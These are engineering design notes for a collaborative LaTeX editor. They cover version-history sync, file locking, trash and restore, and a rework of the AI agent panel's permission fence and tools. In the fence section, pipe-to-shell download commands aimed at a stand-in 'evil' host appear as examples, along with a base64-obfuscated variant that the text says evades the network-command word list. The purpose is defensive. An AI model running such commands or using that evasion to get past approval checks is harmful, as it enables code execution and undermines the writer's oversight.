History was asked for once, when a link opened, and never again. So two
people working together for a week watched each other type continuously and
saw one another's versions only when somebody's laptop closed. It compounded
with the mark: the longer a connection lived the more thinning had run, so
the reconnect that finally exchanged history was the one most likely to find
the mark past the end of the list.

A `HIST_NEW` frame says a file has a past it did not have a moment ago,
debounced, because an editing burst is already one version. It hangs off the
history itself rather than off `record_version`, for two reasons: the trash
records straight onto the history and would otherwise never say a word, and
a relaying install has to speak up when it *absorbs* somebody's lines as much
as when it writes its own.

The ask also came out of the loop's `kind != "text"` guard, so a figure's
past travels now. That was invisible until §24 gave figures a viewer, version
viewing and a clear-history button, all of which assume it does.

### A version that cannot be opened says so

A collaborator's version arrives as a line and its contents come when
somebody asks for them, which is the right trade: almost nobody opens almost
any old version, and a peer's whole past would otherwise be a download before
the first keystroke. But if its author has since thinned that record away and
swept the contents, the line stays and clicking it will always fail.

So the last day of a collaborator's versions, and anything anybody named, is
fetched as the line arrives: across every link rather than the one that sent
it, because a relay can pass on a record for content it does not itself hold.
The rest keeps the on-demand fetch, and the panel marks them *elsewhere*: no
thumbnail is requested for one, and opening it gives a sentence rather than a
restore that cannot work.

### One writer at a time

There was no lock of any kind in `nexttex/history.py`, and every change there
rewrites the whole log. `record` reads the list, appends and writes it back;
so does a peer's lines arriving; and both run off the event loop. The second
writer had read the same list as the first and its write simply erased the
first one's version.

Measured rather than argued: sixteen threads writing twenty versions each to
one file kept **7 of 320** without the lock, and 320 with it.

`versions()` also sorts after parsing now. Everything downstream reads a log
as a sequence, `record` takes the last entry as the previous version,
thinning keeps the last of each bucket, a collaborator asks for everything
after a moment, and a rename onto a name that already had a past used to
append one log's text onto the other's and leave the result out of order on
disk. Sorting on read repairs a log already in that state.

### Deleting, trashing, and coming back

*Clearing a file's history* is the only destructive thing the store does, and
§24 covers it. What is new here is that it leaves a **floor** behind, per
author, so a collaborator still holding those records cannot hand them back.
Nothing is gossiped: a purge is a decision about one disk.

*A rename* is one field in the manifest changing, which is what keeps
everybody's editor pointed at the same document. What it never did was move
the file on the other machine, so that machine kept the old name with the old
contents, the new name appeared only when somebody happened to type into that
document, and then it had both: with the history still filed under the old
name, because nothing in the collaboration layer ever called `note_move`. It
follows both now, on the projection's own timer rather than inside the
manifest transaction, which may not touch a disk.

*A deletion* had the mirror of that. The record is flagged, projection stops
writing the file, and the file sat there: in the tree, written by nothing,
with no trash entry and therefore no way for the person at that machine to
put it back. Opening it in another editor made the watcher ingest a path
whose record is trashed, and `file_id_for` skips trashed records, so that
machine ended up holding two documents for one path. A deletion now goes into
the receiving machine's own trash, which is what gives that person a restore.

*A restore whose old name has been taken* comes back beside it, and its past
comes with it. Not by renaming the log: history is keyed by path, so the log
at the old name holds the restored file's past **and** the past of whatever
took the name after it went, which is exactly why `Trash._forget` checks
whether anything lives there before forgetting. Renaming would hand one
file's history to another. It is cut at the last deletion instead, which is
always there to cut at because a deletion is never thinned away.

The collaborative half of that was worse. `untrash` was told only the name
the file came back under, which matched no trashed record at all, so a fresh
id was minted after all: the original document stayed trashed for ever with a
collaborator's offline edits sealed inside it, and that peer went on holding
a stale file it could no longer write to. It is told both names now.

### Two smaller things that were promises rather than facts

Neither the history nor the trash called `write_atomically`, though the trash
imported it. Every write was a temp file and a rename with nothing flushed,
which is exactly what that function exists to prevent: the rename lands, the
bytes do not, and the file comes back the right length and full of zeroes.
Worse, `put` short-circuits on a name that already exists, so one such blob
made that version unopenable for good with no way back. Reading a blob that
will not decompress now drops it, so the next save of that content writes it
properly.

And a shared project never swept its own history. Collection ran when a
session was evicted, and a shared project is deliberately never evicted, so
unless the writer emptied the trash or cleared a file by hand it kept every
thinned version's contents for ever: the exact failure eviction-time
collection was added to fix, reintroduced by the rule that keeps shared
projects alive. An open project is swept hourly now.

### Deliberately not done

**Project-level shared retention.** A convergence protocol, thinning
tombstones, an agreed depth: all rejected. It is a large amount of new shared
state to fix what was a ten-line bug, and more shared state is less robust,
not more.

**Delivering a binary file's bytes to a joiner.** A joiner gets a manifest
entry for `figures/plot.png` and no file. That is real, and it is a
file-sync gap rather than a history one; syncing a figure's *past* is done.

**Rekeying history on the collaboration file id** rather than on the path
slug. Three keyspaces meeting, the path slug, the file id, the trash entry
id, is the root cause behind two of the findings above. Following the
manifest's path on the receiving side is the minimal correct fix; rekeying is
a migration deserving its own run.

**The reaper's window.** It takes a session out of the table and then awaits
its close, so a request landing in that window builds a second history on the
same directory while the first is still writing to it. Closing that properly
needs `session_for` to be able to wait, and it is called synchronously from
most of the routes in `server/main.py`.

### One thing the audit got wrong, recorded because it was believed

`BlobStore.collect` was reported as returning after its first shard, which
would have meant collection swept a two-hundred-and-fifty-sixth of the store.
It does not; the `return` is after the loop. The report's rendering of the
indentation was misleading. It is written down here because it was nearly
acted on, and a fix to code that is already right is how a real bug gets
introduced.

## 27. A figure the agent could not look at

The agent wrote a script that drew a figure, ran it, and then read the PNG
back to see whether the panels were right. That read killed the session.
The reader raised `CLIJSONDecodeError`, the turn stopped mid-sentence, and
every question typed afterwards came back in under two milliseconds saying
the connection to the model had ended. Only a new conversation worked, and
a new conversation loses the thread that made the figure worth checking.

Two separate faults, and the second one is the expensive one.

**The wire carries an image twice.** The SDK frames the CLI's stdout as
newline-delimited JSON and refuses any single line over a megabyte, which
sounds generous until an image is involved. Base64 adds a third. The
`PostToolUse` hook adds the rest: with a hook registered, the CLI sends the
result out once as a control request so the hook can see it, and again in
the user message. A 290 KB figure measured 576 KB in the control request
and 1,151,564 bytes in the user message. Without the hook the same read
produces an 851 KB line and squeaks under the limit, which is why this is a
failure shaped like NextTex rather than one everybody hits.

The ceiling is now sixty-four megabytes. Not "enough for that figure":
enough for any image the model will accept. Nothing is preallocated, so a
ceiling that high only costs memory when a line really is that long, and
being exact instead of generous only buys another incident.

The same reader taught a second lesson on the way past. A call is recorded
when its `PreToolUse` hook fires and forgotten when `PostToolUse` fires, so
a turn that dies between the two leaves a call that is running for ever.
Nothing noticed, because the table is only read by the watchdog that ends
silent turns, and it reads it on the *next* turn: a phantom `Read` would
hold a stuck turn open, and then, minutes later, end a healthy one by
reporting that a tool nobody had called was still going. No turn begins
with a call already running, so a turn now begins by emptying it.

**A dead client is still an object.** When the reader died, the client
stayed in `self._client`, connected to a subprocess whose reader task was
gone. It answered `receive_response` the way a closed stream does, by
ending at once, so the turn fell straight through to the path that reports
a stream with no result. That path was working exactly as written. What
nobody had considered is that it would be reached again on the next
question, and the one after, for ever.

So both endings now drop the client: the one that raises and the one that
quietly stops. The next question builds another, and because the session id
is on disk the new client resumes the same conversation, which is the point.
The drop names the client it is dropping, so a rebuild that has already
happened elsewhere is not undone by a late arrival.

There is a shape here worth keeping. A failure that loses one answer is an
incident; a failure that poisons the cache is an outage. Anything held
between turns has to be asked, when a turn ends badly, whether it is still
worth holding.

---

## 28. Rebuilding the agent panel

The panel had an end-to-end spec and a fence with six hundred lines of tests, and it had never been audited as a whole the way the palette, the installer and the collaboration layer had. Three things about it were unpleasant enough to be worth a run of their own: hundreds of permission cards in a row, each one disabling the composer until it was answered; a panel that went quiet while a turn worked, because nothing told it a tool call had ended; and an agent that could delegate to a subagent whose work nobody could see. The four capabilities added alongside are in the sections below.

This section is written as the run goes rather than at the end, and every deviation from the specification above is recorded here with its reason, per this document's own preamble.

### The panel had no way to know a call had finished

Nothing emitted anything when a tool call came back. `PostToolUse` recorded an edit and returned; a call that read a file, or ran a build, or searched the literature produced one event on the way in and none on the way out. So the activity line in the header had to guess, and it guessed by walking the whole transcript backwards on every render, taking the last thing it recognised as the thing happening now. That is twenty walks a second while an answer streams, and worse than the cost is that the answer was wrong in the one case that mattered: a turn that spent twenty seconds inside a single tool showed the same line for twenty seconds and read as a turn that had stopped.

There is a `tool_done` event now, carrying the call's id, its name, how long it took and whether it worked, and `activity` is a slice of state set from the events rather than derived from the rendered items. The name travels as well as the id, because the id in the hook comes from the CLI and the id on the row comes from the assistant message: those are believed to be the same string and it cannot be proved from the SDK's source, so the store matches on the id and falls back to the name. A mismatch then costs a duration on one row rather than an activity line that never clears, which is the thing the event exists to fix.

**A tool that failed never reported at all, and that was a second bug underneath the first.** `PostToolUseFailure` is a separate hook event and this app registered only `PostToolUse`, so a call that failed left its entry in the running-call table for ever. The watchdog reads that table: a turn holding a phantom running call waits against the one hour tool timeout rather than the fifteen minute silence timeout, so a turn that genuinely died after a failed tool sat there for an hour before anything ended it. Both hooks are registered now, one handler reads `hook_event_name` to tell them apart, and a failed write drops the undo snapshot the fence took on the way in rather than leaving a file's whole text in memory.

Durations show on a tool row only past half a second. A duration on every row is a column of `0.0s` down the transcript, and half a second is where a reader starts to care; what it buys is that the tool rows stop being a list of verbs and become a record of where a turn went. Collapsed rows sum rather than keeping the first one's number, because fourteen reads folded into one row should say what the fourteen cost.

### An elapsed count, which is not the spinner section 6 forbids

Section 6 says no spinners anywhere, and section 7 gives the argument: an indicator shown at 0 ms on a fast task is what converts an imperceptible wait into a watched one, which is why the compile hairline waits 400 ms before it appears. Both hold. What the panel needed was not a spinner but an answer to *is this still going*, for a turn that can legitimately spend a minute in one call.

So the activity line carries an integer of seconds, in tabular figures with a reserved width, and it appears only once the current activity has passed three seconds. Three seconds is the same argument as the hairline's 400 ms applied to a tool call rather than to a build. It does not animate, it does not move, and nothing periodic goes on the wire for it: one timestamp arrives with the event and the subtraction happens in the browser. The 1400 ms breathing dot that was already there stays, and is still the only repeating animation in the panel.

### The agent's own plan for the turn was being thrown away

`TodoWrite` was in the panel's hidden-tools set, described as plumbing rather than work. It is not plumbing. It is the model stating what it intends to do and ticking items off as it goes, it already arrived on the wire on every turn that used it, and the panel discarded it. This was the cheapest thing in the whole run: the data was already there and nothing new had to be emitted.

It is drawn as the turn's plan, pinned in the stream and replaced in place as later calls revise it, so a turn that rewrites its list four times shows one list rather than four rows. Rows rather than a card, and the stripe vocabulary is the one the panel already uses: `--ok` for what is done, `--pen` for the item in hand, `--line` for what is still to come. No checkbox glyphs, because a checkbox invites a click that would do nothing.

It is deliberately not in the transcript. The transcript is the account of what was done to the manuscript and a rehearsal is not, and looking at it made that concrete: recording the call meant a reload replayed the plan as a tool row named `TodoWrite`, so the one readable thing about a long turn came back as protocol noise. It is not recorded at all now. It survives until the next question rather than vanishing on `done`, which is deliberate: a finished plan with every item struck through says what the turn set out to do and that it got there, and clearing it the instant the answer lands would make the panel flicker at the end of every turn. `ToolSearch` stays hidden, because that genuinely is plumbing.

### Thinking is shown as a fact and never as prose

`ThinkingBlock` was imported and never handled, which looked like an oversight and was two: the `thinking` option on the SDK's own options object was never set either, so it was possible no thinking block had ever arrived.

**That option is still not set, and the reason is the model list.** Its own documentation says `{"type": "adaptive"}` is the default for models that support it and names Opus 4.6 and later, and this app offers Haiku 4.5 in its picker. Setting it unconditionally would be choosing, on the writer's behalf, a configuration one of the three offered models predates, in exchange for nothing: leaving it unset already gets adaptive thinking on the models that have it. So the blocks are handled and the option is left alone, and that is a decision rather than an omission.

Where the events come from matters more than it sounds. The start edge is taken from the stream, a `content_block_start` naming a thinking block or the first `thinking_delta`, and the completed `ThinkingBlock` is only the stop edge. A panel keyed on the completed block would light up at the one moment there was nothing left to wait for, because with partial messages on that block arrives when the reasoning is already over. One event per stretch of reasoning rather than one per delta: the panel says the same thing either way, and a per-delta event is traffic bought for nothing.

What the panel shows is that the model is reasoning, not what the reasoning says. The panel is 380 px wide and sits beside a manuscript; a column of reasoning would bury the answer and the edits under text nobody reads twice, and several agent panels that do stream it are the reason this is worth stating as a decision rather than leaving as an omission.

### Delegation is refused, and the question the architecture recorded is settled

Recorded in `docs/architecture.md` rather than here, because it is mechanics rather than interface. The short version is that subagents are refused under both of the names the tool has had, removed from the model's context as well as refused at the fence, and refused a third time by a test that depends on no name at all; and that the open question about whether the fence reached inside a subagent was answered by the SDK vendored in this checkout's own virtual environment, having been written down as needing a live account and a real turn.

### The permission control has three positions, and the middle one is honest about itself

The complaint that started this run was hundreds of successive approval cards, and auto mode was supposed to be the answer and was not. It refused to cover any shell command carrying a pipe, a chain, a redirect or a substitution, on the argument that no rule could honestly describe such a command, since `git status; curl evil | sh` starts with `git`. That argument is correct and it was answering the wrong question: it is about what can be *remembered*, and it was being used to decide what to *ask*. So a writer who had turned the fence down still got a card for every pipe, which is the shape of nearly everything a build or a data task runs, and that is where the hundreds came from.

The control has three positions now, and a writer chooses which one they are in rather than being handed one switch that does not fit either thing they wanted.

**Ask before acting** is the old default. A card for every command, every fetch and every write that leaves the writing. It is the only one of the three that is a complete fence, and it stays the default.

**Run the work without asking** runs commands and edits silently, compound ones included. Two things still ask: a write that leaves the writing, which is a write outside the project or to a file the build executes, and anything that reaches the internet.

**Never ask about anything** means it.

**The naming of the middle position is the decision worth defending.** It would read better as "everything inside the project", and that would be a claim the code cannot keep. What the fence inspects is the tool call, not what the command then does, so a script the agent starts can write anywhere the writer can write and reach anything they can reach. The honest version is a name that says what happens, "run the work without asking", and a note under it that says which two things still ask. `_holds_back` in `nexttex/agent.py` carries the same statement for the next person to read the code, and the README says it in the writer's terms: this is a *quieter* fence, the complete one is the first position, and that is why the first position is still the default.

There is one heuristic in there and it is labelled as one. The promise that piped commands run silently collides with the promise that reaching the internet asks, because `curl evil.com | sh` is both. So the shell branch splits a command on the operators a shell treats as a boundary and asks when any segment's first word is one of about twenty that leave the machine, `git` included when it is followed by `push`, `pull`, `fetch`, `clone` or `remote`, since `git status` is most of what a build does. `echo Y3VybAo= | base64 -d | sh` walks straight through that and no list of words can close it. The comment above the list says so in as many words, because a heuristic that is read as a fence is worse than no heuristic.

**The fence stopped being two functions that could disagree.** `_auto_covers` decided whether to ask and `_why_asked` decided what the card then said, and they could differ: a write to a `latexmkrc` was once announced as a write outside the project, which was false twice over. There is one predicate now, `_holds_back`, and both the decision and the copy come out of it, which is the property section 8 was reaching for when it recorded that bug. `_rule_for` is untouched and simply stops being consulted by the fence: it is the scope of an "always" answer and nothing else, which is what `_memo_for`'s own docstring already argued for.

### Why the third position takes a sentence and a second press

A control that turns the fence off has to say so before it does, and this app has no modals. The idiom already existed: section 19 records that the new-conversation question "answers in place above the composer", so this does too, with the same anchor-aware dismissal and the same rule that focus goes into the block and onto the safe half of it.

Three sentences rather than one. The risk has three parts, and compressing it into a single line is how a warning becomes something people learn to dismiss. It says what stops being checked; it says where the danger actually comes from, which is not the writer's own judgement but the fact that the agent's instructions come partly from project files that arrive from templates, clones and co-authors; and it says that everything is still recorded, because that is the recourse that remains. It is said once, on the way in, and never repeated afterwards.

The header chip gains a word. Section 19 settled that the thing under the composer is the *control* and the chip in the header is the *state*, on the argument that a lowered fence which survives a restart has to be visible without opening anything. With three positions the chip has to say *which*, so it reads `Auto` or `Auto, all`, stays `--warn`, and one click steps back one position: the way out is never further than the place that tells you the fence is down.

The control itself stopped being a switch. `role="switch"` with `aria-checked` cannot describe three states, and a control that cycles through them makes the writer press it twice to find out where they are, so it is a three-row popover opening upward, which is the model picker's shape two icons along. Like every toggle popover in this app it passes its trigger to `useDismiss`, without which it closes on `pointerdown` and reopens on `click`.

### An answer that lasts as long as the conversation

The two things the middle position still asks about are things a turn asks about repeatedly. A run that adds eleven references put up eleven identical cards, and neither existing answer fitted: `Allow` was too little, and `Allow always` was a permanent grant the writer did not want to make for one afternoon's reading.

So there is a fourth answer, and the whole of "for this conversation" is that it is a set on the object. No file, no expiry timer, no cleanup path: `reset()` empties it, and the process ending empties it. It is keyed exactly the way a remembered answer is, so a compound command is covered by its own exact text and nothing else, and a remembered answer outranks it in the record, because that is the one the writer will go looking for in their settings later.

### The stand-in had to learn all three positions, and a gap

`ScriptedAgent` modelled the boolean, so a browser spec could see two of the three cases and not the third. It carries the mode now and it takes `holds` in the fence's own vocabulary, `outside`, `control` or `network`, so a script says what would stop a call rather than saying whether the switch covers it.

The part worth recording is smaller and cost a real half hour. The stand-in emitted `tool_use` and `tool_done` back to back, which no real call does, so every scripted call started and finished before anything could draw and the activity line went straight back to `Thinking`. A spec asserting that the panel names the file being read could not see the case a writer sees. The gap is the feature: the stand-in now waits its scripted duration between the two events. `docs/testing.md` says a stand-in kinder than the real thing tests nothing, and a stand-in *faster* than the real thing is the same failure wearing a different hat.

### The card stops taking the conversation away, which section 5 asked for

Section 5 specifies that the permission card blocks and that the composer disables and reads `Waiting on your approval`. The build did that, and it is wrong, so this is a recorded deviation rather than a drift.

The argument for the block was written for a world with a handful of cards in a session. What it does in practice is take the conversation away at the exact moment the writer has something to say, because the question they want to ask is very often *about* the thing the card is asking about: why does that need a shell, do it a different way, no, use the other file. A box that will not accept typing turns that into a thought they have to hold until the machine is ready for it.

What makes the change safe is machinery that was already there and unused by this surface. A question asked while a turn is running goes onto a queue and out when the turn ends, which is the `yours will go next` line. A card open means a turn is running, so a question typed during one queues itself with no new code at all. And the card's keyboard answers are bound to the card element rather than to the window, which section 5 records as being for CodeMirror's sake: the consequence is that typing `a` or `d` into a live composer is a letter in a sentence and cannot answer a gate.

Two things deliberately do not change. `awaitingPermission` still drives the `--warn` dot in the header and the state dot on the floating pill, because *the agent is waiting for you* has to be visible when the panel is closed, which is precisely when it needs saying. And the 350 ms input shield stays: it protects against a click already travelling toward the composer, which is a different concern from whether the writer may type.

The composer's own line says what changed, once, rather than leaving it to be discovered: `Waiting on your approval`, and `Waiting on your approval · yours will go next` when something is already queued behind the card. It used to print nothing there, because the box beside it was dead. (This paragraph quoted it as `Waiting on your approval, or ask something else`, which was the specification; the build says the shorter thing and says the queue separately, and the build is right, because "or ask something else" is an invitation and the state line is a statement.)

### Records collapse, questions never do

At a quiet position the transcript writes a row for every action, and at the quietest one that record is the only account of what was done, so a turn with forty tool calls produces forty `Allowed automatically` lines. That is the audit trail working and unreadable at the same time.

Consecutive records with the same tool, the same decision and the same literal text collapse into one row with a count, which is the shape `tidy` already used for repeated tool rows. The rule that matters is the other half: an *undecided* card never collapses with anything, however much it has in common with the one above it, because a card is a question and two questions are two answers the writer owes. One row with a count would be one press for both.

The resolved row also gained two states, taking it to five. `Allowed for this conversation` and `Allowed from now on` are not the same thing as each other or as `Allowed`, and the record has to be able to say which, because the last of them is the one a writer goes looking for in their settings a week later. The dots stay as they were: `--ok` for what a person allowed, `--ink-3` for what they refused, `--warn` for what nobody was asked about.

The fourth button carries the keyboard hint `C`, alongside `A`, `⇧A` and `D`, and appears under the same condition `Allow always` does, which is that there is something nameable to scope the answer to. Four buttons at the panel's 320 px minimum is why section 5's `flex-wrap` note exists, and the row was already built to give way rather than pushing `Deny` off the card.

### The editor goes to the line while the agent is writing it, not after

`handlers.onAgentEdit` already opened the file and scrolled to the changed line once an edit had landed, which is a report rather than a collaboration: the writer reads about it afterwards. The other half is knowable only at one moment, and it is not the one anybody would reach for first.

The fence knows. On the branch that approves a write inside the project it has just read the file to take the undo snapshot, so the tool arguments say what the model is matching on and the snapshot says what it will match against. A second later the file has changed and the question has no answer. So `landing_line` runs there, against that text, and a `focus` event carries the path and the line before the write happens.

It returns nothing rather than a guess wherever the answer is not certain: an `old_string` that is absent, or that occurs more than once, which `replace_all` makes an ordinary case rather than a strange one. A flash on the wrong paragraph is worse than no flash, because it sends the reader to look at something that did not change and spends the trust that the highlight means anything.

The browser side is `jump` with two things taken out rather than a second function. `steal` decides whether the dispatch carries a selection and whether the view is focused, and everything else, the clamping, the word lookup, the scroll and the two teardown timers, is shared. The highlight holds three seconds for a `focus` rather than the 700 ms a jump uses, because the write it points at has not happened yet and a flash that has faded before the text changes has pointed at nothing.

**The caret rule was too narrow and this is where that showed.** `onAgentEdit` spared the composer: it checked whether the active element was a textarea and handed focus back afterwards. So a writer typing in the *editor* had their cursor thrown across their own document by the agent's edit, which is the same bug as the one being fixed, in the surface being fixed. Neither path takes focus now, and both consult one question instead: has this person typed into the document in the last three seconds. Three seconds is a pause in typing rather than a pause in thinking, and it is deliberately not a focus check, because the caret sits in the editor for the whole time somebody is reading their own paragraph.

`busyTyping` lives in `timing.ts` rather than in the store, because it is read imperatively by whoever is about to move the view and must not cause a render: it changes on every keystroke. It counts only local changes, using the annotation the collaboration binding already sets, so a co-author typing does not pin this person's view in place.

`firstChangedLine` exists twice, once in Python and once in the browser, and the Python side briefly had it three times before that got fixed properly. The fence needs it, the stand-in needs it, the OpenAI agent needs it, and none of them may import `agent.py` to get it, because that pulls in the Claude SDK: so it lives in `nexttex/lines.py` alongside the `\end{document}` scan, which was also written twice and for the same reason. The browser's copy cannot be shared and stays, and `tests/test_agent_parity.py` asserts the same six cases against the Python one with a comment in each file naming the other.

### The preview follows too, and the anti-jump rule decides how

The machinery for this existed end to end and nothing was triggering it. `source_to_pdf` in `nexttex/synctex.py` answers where a source line ended up, `server/main.py` serves it, and `Pdf.tsx` has a `reveal` handle that already handled both view modes with the arithmetic each needs: in page mode it sets the current page and renders it, and in scroll mode it scrolls to the box's offset within its page container, less a third of the pane's height so the target lands in the upper third rather than against the edge. The only thing that called it was `Cmd/Ctrl-Enter`, which is a person saying take me there.

An agent edit gets it now, and it waits for the build. Forward search reads the `.synctex.gz` that the last build wrote, so asking the moment the edit lands answers for the document as it was before the edit. The place is held until `onCompileDone`, which is when there is something true to move to.

**Two things decide how far this goes, and they pull in opposite directions.** Section 4 records that the diagnostics drawer deliberately never opens itself, because the build fires 1.6 seconds after every pause in typing, which is very often mid-thought. Section 6's anti-jump rule says the same thing about the preview. Against that: an agent edit puts content somewhere the writer was not looking, which is exactly the case forward search exists for.

This first shipped as *agent edits only*, on the reading that the writer's own typing was the diagnostics drawer's case in the other pane. The writer asked for their own typing too, and they were right, which is worth recording as a correction rather than as a preference: the argument against it was about a page that jumps *while nothing has changed on it*, and the argument had quietly borrowed the drawer's situation, where a list of errors covers the document you are reading. The preview covers nothing. Following the caret after a build is the same act as the double-click that already goes the other way, and a writer editing chapter five while the page shows page two is looking at a stale answer rather than a useful one.

So both move it, and one rule does the work of keeping it quiet. **The move is gentle**, which is a flag on `reveal` rather than a second function: it moves the view only when the target is not already in front of the reader, and both modes need that question answered differently, page mode asking whether the page on screen is this one and scroll mode asking whether the box is inside the part of the document the reader can see. Either way the box flashes, because something did change there. That is what makes following the caret unobtrusive in the common case, which is a writer working down a page they are already looking at: nothing moves.

**Whether a build was caused by this person typing is decided when it starts, not when it lands**, and that is the one thing here that is not obvious. At the end the question has no stable answer: the build fires 1.6 seconds after a pause and takes a third of a second on a chapter, so a keystroke is recent when that lands, while a full thesis takes seventeen seconds, by which time the same test says nobody has typed. Deciding at the end would have meant the preview following a chapter build and not a thesis one, for no reason a writer could infer. At the start the answer is stable whatever the build costs.

So a rebuild the writer asked for explicitly while reading moves nothing, a collaborator's edit moves nothing, and neither does an agent edit landing while the writer is mid-sentence. There is a browser spec for the negative case as well as the positive one, because the negative one is the anti-jump rule and it is the half that would rot silently.

### Select a paragraph and say what to do with it

The selection already reached the store undebounced, already travelled with the question, and the composer already showed a chip saying which lines went with it. Two things were missing, and one of them is not an interface problem at all.

The interface half is a row of verbs over a non-empty selection: **Reword**, **Shorten**, **Expand**, **Ask**. Placed from the document rather than from the pointer, so a selection made with the keyboard gets one too, and above the first selected line rather than below it, because below is where the rest of the paragraph is.

It seeds the composer and does not send. Section 5 settled that rule for the `Fix` button on a diagnostic, and gave the reason: the user always presses Enter on their own message. The argument is stronger here rather than weaker, because rewording forty lines of a chapter is a larger act than fixing one error, and because the second half of the instruction is usually the part that matters. Reword this, *and keep the citation*. The seeded text is a sentence rather than a command word for exactly that reason: it is a first draft of the question, and the writer finishes it.

Four verbs, and the two that are absent are the decision. There is no **Improve**, which says nothing about what will change and produces the diff nobody can review. There is no **Cite**, because section 17's rule is that a citation is never composed, and a verb that looks like it produces one is a promise this app does not make.

A selection has to be worth acting on before the row appears. A double-click on a single word happens constantly while reading, and a control appearing over it every time would be the diagnostics drawer's mistake in a third pane, so the row wants a dozen characters before it draws. It is fetched on that first selection rather than before anything draws, like every other surface in this app that sits behind a gesture.

### The other half was a tool, not a control

"Reword this paragraph" used to reach the model as text and come back as an `Edit` carrying an `old_string` the model had reconstructed from what it was shown. That is fragile in general and specifically fragile here: this project's own writing rule is that one paragraph is one line however long, so the string being reproduced exactly is often several hundred characters, and a stray `%` or an unusual macro breaks it. Worse than breaking, it can match the wrong occurrence in a chapter that repeats a phrase.

`replace_range` takes the path, a first and last line, the replacement, and the text the model was shown. The last of those is the check that matters and it is the one thing this tool has that `Edit` does not need: a turn can spend half a minute thinking while the writer keeps typing, and an edit that silently overwrote what they typed in that window would be the one real harm this feature could do. It is refused instead, with a sentence saying why.

It goes through the same `apply_edit` path as every other in-process tool, so the edit is confined to the project, versioned, folded into the shared document, shown as a chip with its diff, and undoable. It refuses a control file for the same reason `insert_figure` refuses a path outside the project: these tools are waved past the fence precisely because each one promises to stay inside the writing, so the promise is where the test goes.

The OpenAI agent got the same tool, because its `edit_file` is a find-and-replace with the same weakness, and adding a second write tool there finally split the edit event and the fallback write out of `_write` into one `_save` that both use.

### A figure from a dataset, and why the first attempt has to look right

The tool takes a script rather than a chart description, and everything else follows from that. A description-shaped tool can draw a bar chart and cannot draw the figure a paper needs; a script can do anything, and it is also the thing a reader can check, re-run and change next year when a referee asks for the same plot on a log axis. So the script is written into the project's own `scripts/` directory through the same path a chapter takes, which means it gets a version, a chip and a place in the writer's history: it is source they will read, not a temporary file.

**This is the one tool of ours that the fence has to ask about, and it breaks a sentence that was previously true.** The comment above `_ALWAYS_OK` says NextTex's own tools are allowed by construction because none of them can reach the shell or a path outside the project, so a card for one would be a card for nothing, and a card for nothing teaches the writer to click Allow without reading. A tool that runs Python the model wrote can start a subprocess, open a socket and write anywhere the server's user can write: it has strictly more reach than `Bash`. Routing it around the fence would put the app's one real fence behind the one tool whose purpose is to run arbitrary code. So it is fenced like a shell call, asked about at the first position with the script itself as the card's literal text, and silent at the other two. One card per plot is not the hundreds this rework exists to remove, and the comment above `_ALWAYS_OK` now names its own exception rather than leaving the next reader to find the hole.

The run itself is `sys.executable` and nothing else, with no shell on the path, which is deliberate and worth a sentence: it is the virtual environment `requirements.txt` installed matplotlib into, so there is no `PATH` search and no guessing between a system 3.9 and the venv, and the answer does not depend on the writer's shell. `MPLBACKEND=Agg` and no `DISPLAY` is the whole answer to a script trying to open a window: with it set, `show()` is a no-op rather than a wait on an event loop that will never arrive. Output is clipped at 64 kB per stream for the reason section 27 exists. And the run is verified rather than trusted: the output must exist and be newer than the run's start, because a script that exits zero having written nothing is the common failure and reporting it as a success sends the model on to insert a figure that is not there.

### What "publication quality" actually means, and the thing that decides it

The baseline is two files, `scripts/plotstyle.mplstyle` and `scripts/figure.py`, copied into the project the first time it plots and never overwritten afterwards. In the project rather than inside NextTex, because a baseline the writer cannot open is a baseline they cannot argue with, and because their edit to it has to survive the next plot.

Most of what is in them is ordinary good practice: a serif face so the labels match the document rather than the software, two hairline spines instead of a box, ticks pointing in with minors on, no grid, a colour-blind-safe cycle that also separates in greyscale because a referee may print it, a frameless legend, no title because a paper's figure is captioned, and `pdf.fonttype: 42` so the text is not a Type 3 subset that several publishers refuse.

**One decision matters more than all of those together, and it is not a style setting.** A figure must be *drawn* at the width it will be *printed* at and included with no scaling. Then a 10 pt label in the script is a 10 pt label on the page, the same size as the caption under it. Matplotlib's default figure is 6.4 inches wide, and including that at `0.8\linewidth` shrinks every label to about 5 pt, which is the single reason default figures are unreadable. Drawing a 3.4 inch column figure and including it at a one-column article's full text width makes the same mistake in the other direction, and the axis label comes out larger than the body text.

That is why `figure()` takes a width by name and defaults to the text width, and why `\linewidth` rather than `insert_figure`'s usual `0.8\linewidth` is what the model is told to insert these at. It is also why `savefig.bbox: tight` is deliberately *not* set, against matplotlib's usual advice: tight bbox crops the output to the ink, so the saved figure is no longer the width it was drawn at, and the guarantee quietly stops holding. `constrained_layout` already fits the labels inside the figure, which is what tight bbox is normally compensating for, so with it on the saved width is exactly the width asked for.

**All four of those were found by looking, not by reasoning.** The first render came out with the axis label larger than the caption, which the arithmetic above predicts and which no test would have caught. The second came out too small, and the cause turned out to be the ad-hoc test document rather than the figure: an `article` with no `geometry` has a 4.8 inch text block, and NextTex's own template loads `geometry` with one-inch margins and gives 6.52. Measuring `\showthe\textwidth` against the figure's media box settled it: 469.8 pt against 468, and the label measured at exactly 10 pt on the built page. The style sheet's own claim is now a measurement rather than an intention.

Pointing at the dataset is a file-tree item, `Plot this`, offered on the extensions data actually arrives in and on nothing else, because an item that explains itself by failing is worse than no item. It seeds the composer rather than sending, like the selection verbs one pane over and for the same reason.

### The agent screen had no way off it, and the control to reach it was hidden

Reported by the writer during this run, and it is two bugs that look like one.

The screen that chooses a provider did have a Back button, and it was withheld unless `projectId` or a non-empty project list was truthy. That test was standing in for the real question, which is whether the screen was *opened* or *shown*: it is shown at boot when no agent has been chosen, where there is genuinely nowhere to go, and opened from the settings sheet or the project list at any other time. An install that chose no agent at setup, opened its empty project list, and clicked to set one up satisfied neither half of that condition, so it got no way back and the only exit was choosing a provider. The two cases are told apart exactly now, by a flag the opener sets.

Escape does the same thing, one level at a time: out of the provider you were part-way through setting up, then off the screen. That is what Escape means everywhere else here, and section 19 records the rail's own version of the same rule.

The outer control also said `Back`, and so did the button inside each provider's panel, which goes up one level rather than out. Two controls with the same word meaning two different things is its own bug, so the outer one is `Close` and says on the screen that closing leaves things as they are, since somebody may be here only to look.

The second half is that the way *in* was a text link under the strapline, shown only when the provider was `none`. So somebody using one provider who wanted the other had to know it was inside the settings sheet. It is a control in the projects header now, in the cog's own chrome so the three read as a set, present whatever the provider is, and it names the agent rather than only saying there is one, because that is the question somebody opening it has.

